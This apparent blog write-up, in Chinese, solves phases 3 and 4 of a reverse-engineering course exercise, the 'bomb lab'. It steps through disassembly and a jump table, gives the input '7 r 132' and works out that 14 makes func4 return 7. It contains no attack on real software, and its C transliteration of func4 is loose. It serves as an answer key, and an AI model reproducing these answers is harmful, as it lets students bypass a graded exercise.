<h2 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">08048bb1 &lt;phase_3&gt;:</span><br><span class="line"> 8048bb1:	55                   	push   %ebp</span><br><span class="line"> 8048bb2:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048bb4:	83 ec 24             	sub    $0x24,%esp</span><br><span class="line"> 8048bb7:	65 a1 14 00 00 00    	mov    %gs:0x14,%eax</span><br><span class="line"> 8048bbd:	89 45 f4             	mov    %eax,-0xc(%ebp)</span><br><span class="line"> 8048bc0:	31 c0                	xor    %eax,%eax</span><br><span class="line"> 8048bc2:	8d 45 f0             	lea    -0x10(%ebp),%eax</span><br><span class="line"> 8048bc5:	50                   	push   %eax</span><br><span class="line"> 8048bc6:	8d 45 eb             	lea    -0x15(%ebp),%eax</span><br><span class="line"> 8048bc9:	50                   	push   %eax</span><br><span class="line"> 8048bca:	8d 45 ec             	lea    -0x14(%ebp),%eax</span><br><span class="line"> 8048bcd:	50                   	push   %eax</span><br><span class="line"> 8048bce:	68 62 a1 04 08       	push   $0x804a162</span><br><span class="line"> 8048bd3:	ff 75 08             	pushl  0x8(%ebp)</span><br><span class="line"> 8048bd6:	e8 35 fc ff ff       	call   8048810 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line"> 8048bdb:	83 c4 20             	add    $0x20,%esp</span><br><span class="line"> 8048bde:	83 f8 02             	cmp    $0x2,%eax</span><br><span class="line"> 8048be1:	7f 05                	jg     8048be8 &lt;phase_3+0x37&gt;</span><br><span class="line"> 8048be3:	e8 a3 05 00 00       	call   804918b &lt;explode_bomb&gt;</span><br><span class="line"> 8048be8:	83 7d ec 07          	cmpl   $0x7,-0x14(%ebp)</span><br><span class="line"> 8048bec:	0f 87 e9 00 00 00    	ja     8048cdb &lt;phase_3+0x12a&gt;</span><br><span class="line"> 8048bf2:	8b 45 ec             	mov    -0x14(%ebp),%eax</span><br><span class="line"> 8048bf5:	ff 24 85 80 a1 04 08 	jmp    *0x804a180(,%eax,4)</span><br><span class="line"> 8048bfc:	b8 79 00 00 00       	mov    $0x79,%eax</span><br><span class="line"> 8048c01:	81 7d f0 48 03 00 00 	cmpl   $0x348,-0x10(%ebp)</span><br><span class="line"> 8048c08:	0f 84 d7 00 00 00    	je     8048ce5 &lt;phase_3+0x134&gt;</span><br><span class="line"> 8048c0e:	e8 78 05 00 00       	call   804918b &lt;explode_bomb&gt;</span><br><span class="line"> 8048c13:	b8 79 00 00 00       	mov    $0x79,%eax</span><br><span class="line"> 8048c18:	e9 c8 00 00 00       	jmp    8048ce5 &lt;phase_3+0x134&gt;</span><br><span class="line"> 8048c1d:	b8 64 00 00 00       	mov    $0x64,%eax</span><br><span class="line"> 8048c22:	81 7d f0 a4 01 00 00 	cmpl   $0x1a4,-0x10(%ebp)</span><br><span class="line"> 8048c29:	0f 84 b6 00 00 00    	je     8048ce5 &lt;phase_3+0x134&gt;</span><br><span class="line"> 8048c2f:	e8 57 05 00 00       	call   804918b &lt;explode_bomb&gt;</span><br><span class="line"> 8048c34:	b8 64 00 00 00       	mov    $0x64,%eax</span><br><span class="line"> 8048c39:	e9 a7 00 00 00       	jmp    8048ce5 &lt;phase_3+0x134&gt;</span><br><span class="line"> 8048c3e:	b8 70 00 00 00       	mov    $0x70,%eax</span><br><span class="line"> 8048c43:	83 7d f0 46          	cmpl   $0x46,-0x10(%ebp)</span><br><span class="line"> 8048c47:	0f 84 98 00 00 00    	je     8048ce5 &lt;phase_3+0x134&gt;</span><br><span class="line"> 8048c4d:	e8 39 05 00 00       	call   804918b &lt;explode_bomb&gt;</span><br><span class="line"> 8048c52:	b8 70 00 00 00       	mov    $0x70,%eax</span><br><span class="line"> 8048c57:	e9 89 00 00 00       	jmp    8048ce5 &lt;phase_3+0x134&gt;</span><br><span class="line"> 8048c5c:	b8 7a 00 00 00       	mov    $0x7a,%eax</span><br><span class="line"> 8048c61:	81 7d f0 c4 02 00 00 	cmpl   $0x2c4,-0x10(%ebp)</span><br><span class="line"> 8048c68:	74 7b                	je     8048ce5 &lt;phase_3+0x134&gt;</span><br><span class="line"> 8048c6a:	e8 1c 05 00 00       	call   804918b &lt;explode_bomb&gt;</span><br><span class="line"> 8048c6f:	b8 7a 00 00 00       	mov    $0x7a,%eax</span><br><span class="line"> 8048c74:	eb 6f                	jmp    8048ce5 &lt;phase_3+0x134&gt;</span><br><span class="line"> 8048c76:	b8 6b 00 00 00       	mov    $0x6b,%eax</span><br><span class="line"> 8048c7b:	83 7d f0 68          	cmpl   $0x68,-0x10(%ebp)</span><br><span class="line"> 8048c7f:	74 64                	je     8048ce5 &lt;phase_3+0x134&gt;</span><br><span class="line"> 8048c81:	e8 05 05 00 00       	call   804918b &lt;explode_bomb&gt;</span><br><span class="line"> 8048c86:	b8 6b 00 00 00       	mov    $0x6b,%eax</span><br><span class="line"> 8048c8b:	eb 58                	jmp    8048ce5 &lt;phase_3+0x134&gt;</span><br><span class="line"> 8048c8d:	b8 72 00 00 00       	mov    $0x72,%eax</span><br><span class="line"> 8048c92:	81 7d f0 a1 01 00 00 	cmpl   $0x1a1,-0x10(%ebp)</span><br><span class="line"> 8048c99:	74 4a                	je     8048ce5 &lt;phase_3+0x134&gt;</span><br><span class="line"> 8048c9b:	e8 eb 04 00 00       	call   804918b &lt;explode_bomb&gt;</span><br><span class="line"> 8048ca0:	b8 72 00 00 00       	mov    $0x72,%eax</span><br><span class="line"> 8048ca5:	eb 3e                	jmp    8048ce5 &lt;phase_3+0x134&gt;</span><br><span class="line"> 8048ca7:	b8 72 00 00 00       	mov    $0x72,%eax</span><br><span class="line"> 8048cac:	81 7d f0 80 00 00 00 	cmpl   $0x80,-0x10(%ebp)</span><br><span class="line"> 8048cb3:	74 30                	je     8048ce5 &lt;phase_3+0x134&gt;</span><br><span class="line"> 8048cb5:	e8 d1 04 00 00       	call   804918b &lt;explode_bomb&gt;</span><br><span class="line"> 8048cba:	b8 72 00 00 00       	mov    $0x72,%eax</span><br><span class="line"> 8048cbf:	eb 24                	jmp    8048ce5 &lt;phase_3+0x134&gt;</span><br><span class="line"> 8048cc1:	b8 72 00 00 00       	mov    $0x72,%eax</span><br><span class="line"> 8048cc6:	81 7d f0 84 00 00 00 	cmpl   $0x84,-0x10(%ebp)</span><br><span class="line"> 8048ccd:	74 16                	je     8048ce5 &lt;phase_3+0x134&gt;</span><br><span class="line"> 8048ccf:	e8 b7 04 00 00       	call   804918b &lt;explode_bomb&gt;</span><br><span class="line"> 8048cd4:	b8 72 00 00 00       	mov    $0x72,%eax</span><br><span class="line"> 8048cd9:	eb 0a                	jmp    8048ce5 &lt;phase_3+0x134&gt;</span><br><span class="line"> 8048cdb:	e8 ab 04 00 00       	call   804918b &lt;explode_bomb&gt;</span><br><span class="line"> 8048ce0:	b8 72 00 00 00       	mov    $0x72,%eax</span><br><span class="line"> 8048ce5:	3a 45 eb             	cmp    -0x15(%ebp),%al</span><br><span class="line"> 8048ce8:	74 05                	je     8048cef &lt;phase_3+0x13e&gt;</span><br><span class="line"> 8048cea:	e8 9c 04 00 00       	call   804918b &lt;explode_bomb&gt;</span><br><span class="line"> 8048cef:	8b 45 f4             	mov    -0xc(%ebp),%eax</span><br><span class="line"> 8048cf2:	65 33 05 14 00 00 00 	xor    %gs:0x14,%eax</span><br><span class="line"> 8048cf9:	74 05                	je     8048d00 &lt;phase_3+0x14f&gt;</span><br><span class="line"> 8048cfb:	e8 90 fa ff ff       	call   8048790 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line"> 8048d00:	c9                   	leave  </span><br><span class="line"> 8048d01:	c3                   	ret</span><br></pre></td></tr></table></figure>
<p>观察到没有用到什么奇特的函数，我们先来看一下输入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">8048bc2:	8d 45 f0             	lea    -0x10(%ebp),%eax</span><br><span class="line">8048bc5:	50                   	push   %eax</span><br><span class="line">8048bc6:	8d 45 eb             	lea    -0x15(%ebp),%eax</span><br><span class="line">8048bc9:	50                   	push   %eax</span><br><span class="line">8048bca:	8d 45 ec             	lea    -0x14(%ebp),%eax</span><br><span class="line">8048bcd:	50                   	push   %eax</span><br><span class="line">8048bce:	68 62 a1 04 08       	push   $0x804a162</span><br><span class="line">8048bd3:	ff 75 08             	pushl  0x8(%ebp)</span><br><span class="line">8048bd6:	e8 35 fc ff ff       	call   8048810 &lt;__isoc99_sscanf@plt&gt;</span><br></pre></td></tr></table></figure>
<p><code>push</code>了三个参数进去，格式很有可能放在<code>0x804a162</code>里，我们check一下</p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112191548285.png" alt="image-20211219154822628"></p>
<p>显然，这次让我们输入三个数，两个整型，一个字符型</p>
<p>那么我们就继续搞我们的 sepcial input</p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112191549779.png" alt="image-20211219154954811"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">8048bd6:	e8 35 fc ff ff       	call   8048810 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">8048bdb:	83 c4 20             	add    $0x20,%esp</span><br><span class="line">8048bde:	83 f8 02             	cmp    $0x2,%eax</span><br><span class="line">8048be1:	7f 05                	jg     8048be8 &lt;phase_3+0x37&gt;</span><br><span class="line">8048be3:	e8 a3 05 00 00       	call   804918b &lt;explode_bomb&gt;</span><br></pre></td></tr></table></figure>
<p>获取了输入以后，我们看到有个<code>cmp</code>，这里是检查输入格式是否正确，当<code>%eax &gt; 0x2</code>时跳转，否则爆炸</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">8048be8:	83 7d ec 07          	cmpl   $0x7,-0x14(%ebp)</span><br><span class="line">8048bec:	0f 87 e9 00 00 00    	ja     8048cdb &lt;phase_3+0x12a&gt;</span><br></pre></td></tr></table></figure>
<p>向下执行，这里比较<code>-0x14(%ebp)</code>与<code>0x7</code>的大小，根据前面的<code>push</code>顺序，我们知道<code>-0x14(%ebp)</code>是我们的第一个输入，如果<code>-0x14(%ebp) &gt; 0x7</code>就跳转到<code>&lt;phase_3+0x12a&gt;</code>，<code>&lt;phase_3+0x12a&gt;</code>时引爆函数，所以这里要求我们第一个输入<code>&lt;= 7</code>，那我们就以<code>7</code>为例，更新测试数据</p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112191559116.png" alt="image-20211219155900658"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">8048bf2:	8b 45 ec             	mov    -0x14(%ebp),%eax</span><br><span class="line">8048bf5:	ff 24 85 80 a1 04 08 	jmp    *0x804a180(,%eax,4)</span><br></pre></td></tr></table></figure>
<p>继续执行，将第一个输入的值给了<code>%eax</code>，然后无条件跳转到<code>0x804a180(,%eax,4)</code>，跟踪程序，发现跳转到了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">8048cc1:	b8 72 00 00 00       	mov    $0x72,%eax</span><br><span class="line">8048cc6:	81 7d f0 84 00 00 00 	cmpl   $0x84,-0x10(%ebp)</span><br><span class="line">8048ccd:	74 16                	je     8048ce5 &lt;phase_3+0x134&gt;</span><br><span class="line">8048ccf:	e8 b7 04 00 00       	call   804918b &lt;explode_bomb&gt;</span><br></pre></td></tr></table></figure>
<p>这里比较了<code>0x84</code>与<code>-0x10(%ebp)</code>，其中<code>-0x10(%ebp)</code>是我们第三个输入的数据<code>99</code>，要求<code>-0x10(%ebp) = 0x84</code>，否则爆炸，也就是说我们第三个输入的数据必须为<code>132</code>，更新测试数据，继续运行程序</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">8048ce5:	3a 45 eb             	cmp    -0x15(%ebp),%al</span><br><span class="line">8048ce8:	74 05                	je     8048cef &lt;phase_3+0x13e&gt;</span><br><span class="line">8048cea:	e8 9c 04 00 00       	call   804918b &lt;explode_bomb&gt;</span><br></pre></td></tr></table></figure>
<p>终于看到我们输入的第二个数据(字符型)了，这里它和<code>%al</code>比大小，我们来看一下<code>%al</code>的值</p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112191610077.png" alt="image-20211219161050867"></p>
<p><code>%al</code>是16进制的72字符，我们查找ASCII码表</p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112191614328.png" alt="image-20211219161416014"></p>
<p>发现<code>%al</code>为<code>r</code>，因此我们第二位输入的数据也应为<code>r</code></p>
<p>因此<code>phase_3</code>的一个答案</p>
<p><code>7 r 132</code></p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112191615353.png" alt="image-20211219161458156"></p>
<h2 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">08048d5e &lt;phase_4&gt;:</span><br><span class="line"> 8048d5e:	55                   	push   %ebp</span><br><span class="line"> 8048d5f:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048d61:	83 ec 18             	sub    $0x18,%esp</span><br><span class="line"> 8048d64:	65 a1 14 00 00 00    	mov    %gs:0x14,%eax</span><br><span class="line"> 8048d6a:	89 45 f4             	mov    %eax,-0xc(%ebp)</span><br><span class="line"> 8048d6d:	31 c0                	xor    %eax,%eax</span><br><span class="line"> 8048d6f:	8d 45 f0             	lea    -0x10(%ebp),%eax</span><br><span class="line"> 8048d72:	50                   	push   %eax</span><br><span class="line"> 8048d73:	8d 45 ec             	lea    -0x14(%ebp),%eax</span><br><span class="line"> 8048d76:	50                   	push   %eax</span><br><span class="line"> 8048d77:	68 ef a2 04 08       	push   $0x804a2ef</span><br><span class="line"> 8048d7c:	ff 75 08             	pushl  0x8(%ebp)</span><br><span class="line"> 8048d7f:	e8 8c fa ff ff       	call   8048810 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line"> 8048d84:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048d87:	83 f8 02             	cmp    $0x2,%eax</span><br><span class="line"> 8048d8a:	75 06                	jne    8048d92 &lt;phase_4+0x34&gt;</span><br><span class="line"> 8048d8c:	83 7d ec 0e          	cmpl   $0xe,-0x14(%ebp)</span><br><span class="line"> 8048d90:	76 05                	jbe    8048d97 &lt;phase_4+0x39&gt;</span><br><span class="line"> 8048d92:	e8 f4 03 00 00       	call   804918b &lt;explode_bomb&gt;</span><br><span class="line"> 8048d97:	83 ec 04             	sub    $0x4,%esp</span><br><span class="line"> 8048d9a:	6a 0e                	push   $0xe</span><br><span class="line"> 8048d9c:	6a 00                	push   $0x0</span><br><span class="line"> 8048d9e:	ff 75 ec             	pushl  -0x14(%ebp)</span><br><span class="line"> 8048da1:	e8 5c ff ff ff       	call   8048d02 &lt;func4&gt;</span><br><span class="line"> 8048da6:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048da9:	83 f8 07             	cmp    $0x7,%eax</span><br><span class="line"> 8048dac:	75 06                	jne    8048db4 &lt;phase_4+0x56&gt;</span><br><span class="line"> 8048dae:	83 7d f0 07          	cmpl   $0x7,-0x10(%ebp)</span><br><span class="line"> 8048db2:	74 05                	je     8048db9 &lt;phase_4+0x5b&gt;</span><br><span class="line"> 8048db4:	e8 d2 03 00 00       	call   804918b &lt;explode_bomb&gt;</span><br><span class="line"> 8048db9:	8b 45 f4             	mov    -0xc(%ebp),%eax</span><br><span class="line"> 8048dbc:	65 33 05 14 00 00 00 	xor    %gs:0x14,%eax</span><br><span class="line"> 8048dc3:	74 05                	je     8048dca &lt;phase_4+0x6c&gt;</span><br><span class="line"> 8048dc5:	e8 c6 f9 ff ff       	call   8048790 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line"> 8048dca:	c9                   	leave  </span><br><span class="line"> 8048dcb:	c3                   	ret</span><br></pre></td></tr></table></figure>
<p>与<code>phase_3</code>类似，我们先来检查输入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">8048d6f:	8d 45 f0             	lea    -0x10(%ebp),%eax</span><br><span class="line">8048d72:	50                   	push   %eax</span><br><span class="line">8048d73:	8d 45 ec             	lea    -0x14(%ebp),%eax</span><br><span class="line">8048d76:	50                   	push   %eax</span><br><span class="line">8048d77:	68 ef a2 04 08       	push   $0x804a2ef</span><br><span class="line">8048d7c:	ff 75 08             	pushl  0x8(%ebp)</span><br><span class="line">8048d7f:	e8 8c fa ff ff       	call   8048810 &lt;__isoc99_sscanf@plt&gt;</span><br></pre></td></tr></table></figure>
<p><code>push</code>两个参数，查看一下格式</p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112191620554.png" alt="image-20211219162045104"></p>
<p>那就是输入两个整型，继续搞特殊化</p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112191621292.png" alt="image-20211219162126152"></p>
<p><em>69是十分好的数字</em></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">8048d7f:	e8 8c fa ff ff       	call   8048810 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">8048d84:	83 c4 10             	add    $0x10,%esp</span><br><span class="line">8048d87:	83 f8 02             	cmp    $0x2,%eax</span><br><span class="line">8048d8a:	75 06                	jne    8048d92 &lt;phase_4+0x34&gt;</span><br><span class="line">8048d8c:	83 7d ec 0e          	cmpl   $0xe,-0x14(%ebp)</span><br><span class="line">8048d90:	76 05                	jbe    8048d97 &lt;phase_4+0x39&gt;</span><br><span class="line">8048d92:	e8 f4 03 00 00       	call   804918b &lt;explode_bomb&gt;</span><br><span class="line">8048d97:	83 ec 04             	sub    $0x4,%esp</span><br><span class="line">8048d9a:	6a 0e                	push   $0xe</span><br><span class="line">8048d9c:	6a 00                	push   $0x0</span><br><span class="line">8048d9e:	ff 75 ec             	pushl  -0x14(%ebp)</span><br><span class="line">8048da1:	e8 5c ff ff ff       	call   8048d02 &lt;func4&gt;</span><br></pre></td></tr></table></figure>
<p>与<code>phase_3</code>类似，第一个<code>cmp</code>是检查格式，第二个<code>cmp</code>要求<code>-0x14(%ebp) &lt;= 0xe</code>，就是第一个输入<code>&lt;= 14</code>，那我们就以<code>6</code>为例，执行到<code>8048d9a</code>时发现向栈中<code>push</code>了3个数，分别是<code>0xe</code>、<code>0x0</code>、<code>-0x14(%ebp)</code>，接着调用了<code>&lt;func4&gt;</code>，至于这个<code>&lt;func4&gt;</code>是什么牛鬼蛇神，我们来看函数定义</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">08048d02 &lt;func4&gt;:</span><br><span class="line"> 8048d02:	55                   	push   %ebp</span><br><span class="line"> 8048d03:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048d05:	56                   	push   %esi</span><br><span class="line"> 8048d06:	53                   	push   %ebx</span><br><span class="line"> 8048d07:	8b 4d 08             	mov    0x8(%ebp),%ecx</span><br><span class="line"> 8048d0a:	8b 5d 0c             	mov    0xc(%ebp),%ebx</span><br><span class="line"> 8048d0d:	8b 75 10             	mov    0x10(%ebp),%esi</span><br><span class="line"> 8048d10:	89 f0                	mov    %esi,%eax</span><br><span class="line"> 8048d12:	29 d8                	sub    %ebx,%eax</span><br><span class="line"> 8048d14:	89 c2                	mov    %eax,%edx</span><br><span class="line"> 8048d16:	c1 ea 1f             	shr    $0x1f,%edx</span><br><span class="line"> 8048d19:	01 d0                	add    %edx,%eax</span><br><span class="line"> 8048d1b:	d1 f8                	sar    %eax</span><br><span class="line"> 8048d1d:	8d 14 18             	lea    (%eax,%ebx,1),%edx</span><br><span class="line"> 8048d20:	39 ca                	cmp    %ecx,%edx</span><br><span class="line"> 8048d22:	7e 15                	jle    8048d39 &lt;func4+0x37&gt;</span><br><span class="line"> 8048d24:	83 ec 04             	sub    $0x4,%esp</span><br><span class="line"> 8048d27:	83 ea 01             	sub    $0x1,%edx</span><br><span class="line"> 8048d2a:	52                   	push   %edx</span><br><span class="line"> 8048d2b:	53                   	push   %ebx</span><br><span class="line"> 8048d2c:	51                   	push   %ecx</span><br><span class="line"> 8048d2d:	e8 d0 ff ff ff       	call   8048d02 &lt;func4&gt;</span><br><span class="line"> 8048d32:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048d35:	01 c0                	add    %eax,%eax</span><br><span class="line"> 8048d37:	eb 1e                	jmp    8048d57 &lt;func4+0x55&gt;</span><br><span class="line"> 8048d39:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line"> 8048d3e:	39 ca                	cmp    %ecx,%edx</span><br><span class="line"> 8048d40:	7d 15                	jge    8048d57 &lt;func4+0x55&gt;</span><br><span class="line"> 8048d42:	83 ec 04             	sub    $0x4,%esp</span><br><span class="line"> 8048d45:	56                   	push   %esi</span><br><span class="line"> 8048d46:	83 c2 01             	add    $0x1,%edx</span><br><span class="line"> 8048d49:	52                   	push   %edx</span><br><span class="line"> 8048d4a:	51                   	push   %ecx</span><br><span class="line"> 8048d4b:	e8 b2 ff ff ff       	call   8048d02 &lt;func4&gt;</span><br><span class="line"> 8048d50:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048d53:	8d 44 00 01          	lea    0x1(%eax,%eax,1),%eax</span><br><span class="line"> 8048d57:	8d 65 f8             	lea    -0x8(%ebp),%esp</span><br><span class="line"> 8048d5a:	5b                   	pop    %ebx</span><br><span class="line"> 8048d5b:	5e                   	pop    %esi</span><br><span class="line"> 8048d5c:	5d                   	pop    %ebp</span><br><span class="line"> 8048d5d:	c3                   	ret</span><br></pre></td></tr></table></figure>
<p>根据我三四个小时没日没夜的分析，这个函数我没看懂，不过我们可以把它用高级语言写一遍</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//fun4的c版本</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun4</span><span class="params">(<span class="keyword">int</span> ecx, <span class="keyword">int</span> ebx, <span class="keyword">int</span> esi)</span></span>&#123;</span><br><span class="line">	eax = esi;</span><br><span class="line">	eax -= ebx;</span><br><span class="line">	edx = eax;</span><br><span class="line">	edx &gt;&gt;= <span class="number">31</span>;</span><br><span class="line">	eax = edx + eax;</span><br><span class="line">	eax /= <span class="number">2</span>;</span><br><span class="line">	edx = eax + ebx;</span><br><span class="line">	<span class="keyword">if</span>(edx &lt;= ecx)&#123;</span><br><span class="line">		eax = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">if</span>(edx &gt;= ecx)&#123;</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		edx++;</span><br><span class="line">		<span class="built_in">fun4</span>(ecx, edx, esi);</span><br><span class="line">		eax = <span class="number">1</span> + eax*<span class="number">2</span>;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	edx--;</span><br><span class="line">	<span class="built_in">fun4</span>(ecx, ebx, edx);</span><br><span class="line">	eax *= <span class="number">2</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>就算翻译成高级语言，还是说不上这个函数是个啥意思，不过它里面有多处递归，我们先往下分析汇编程序</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">8048da1:	e8 5c ff ff ff       	call   8048d02 &lt;func4&gt;</span><br><span class="line">8048da6:	83 c4 10             	add    $0x10,%esp</span><br><span class="line">8048da9:	83 f8 07             	cmp    $0x7,%eax</span><br><span class="line">8048dac:	75 06                	jne    8048db4 &lt;phase_4+0x56&gt;</span><br></pre></td></tr></table></figure>
<p>注意到调用<code>&lt;func4&gt;</code>后，程序比较了<code>%eax</code>和<code>0x7</code>的值，说明<code>%eax</code>不为<code>0x7</code>就爆炸，那么输入数据是几<code>%eax</code>会变成<code>0x7</code>呢</p>
<p>我们可以遍历<code>0~14</code>，输出调用<code>&lt;func4&gt;</code>后的结果</p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112192123145.png" alt="image-20211219212307854" style="zoom:80%;" /></p>
<p>因此我们可以知道，当第一个输入的数据<code>-0x14(%ebp)</code> 为<code>14</code>时，我们可以得到<code>%eax = 7</code></p>
